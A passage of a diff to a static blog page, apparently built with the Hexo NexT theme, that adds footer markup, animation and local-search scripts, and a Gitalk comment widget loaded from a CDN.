+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
   NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
     var gitalk = new Gitalk({
       clientID    : '17bce98f83f452db5ed3',
@@ -30,4 +784,8 @@
     });
     gitalk.render('gitalk-container');
   }, window.Gitalk);
-});</script></body></html>
+});
+</script>
+
+</body>
+</html>
